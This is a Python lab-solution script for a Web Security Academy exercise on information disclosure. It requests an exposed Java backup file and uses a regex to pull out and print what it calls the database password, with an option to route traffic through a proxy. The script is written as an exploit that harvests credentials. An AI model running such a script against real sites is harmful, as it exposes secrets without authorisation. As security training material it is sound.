#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import re
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Information Disclosure Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net/backup/ProductTemplate.java.bak" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net/backup/ProductTemplate.java.bak" 

Information disclosure via backup files solution: /backup/ProductTemplate.java.bak (found from /robots.txt)
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

url = args.url

def info_disclosure(url):
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        req = requests.get(url, verify=False, proxies=proxies)
    else:
        req = requests.get(url, verify=False)
        # verify the file contains 32-character alphanumric string
        for line in req.content.splitlines():
            s = line.decode("utf-8")
            res = re.search(r'\b[0-9a-z]{32}\b', s)
            if res:
                print("The database password is: ")
                print(res.group())
                print("(+) Information Disclosure Successful")
            else: 
                pass

def main():
    
    print("(+) Exploiting Information Disclosure")
        
    info_disclosure(url)

if __name__ == "__main__":
    main()
